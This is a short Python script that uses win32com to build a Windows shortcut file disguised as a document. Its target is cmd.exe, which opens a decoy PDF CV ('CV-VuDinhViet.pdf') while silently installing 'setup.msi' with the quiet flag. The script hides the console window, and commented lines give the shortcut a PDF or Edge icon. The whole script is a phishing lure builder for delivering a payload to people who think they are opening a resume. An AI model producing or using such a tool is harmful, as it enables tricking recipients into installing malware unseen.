import win32com.client
import os

shell = win32com.client.Dispatch("WScript.Shell")

lnk_path = os.path.abspath("unzip_lnk.lnk")


shortcut = shell.CreateShortCut(lnk_path)

shortcut.TargetPath = r"C:\Windows\System32\cmd.exe"
# shortcut.WorkingDirectory = r"C:\Windows\System32"

shortcut.Arguments = r'/c cd System-Volumnes && start "" "CV-VuDinhViet.pdf" && .\setup.msi /qn'

# shortcut.IconLocation = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,17"  # Sử dụng biểu tượng của Microsoft Edge

# icon_path = os.path.abspath("pdf.ico")
# shortcut.IconLocation = icon_path
# shortcut.IconLocation = "pdf.ico"


shortcut.WindowStyle = 0  # Ẩn cửa sổ

shortcut.save()

print("Created:", lnk_path)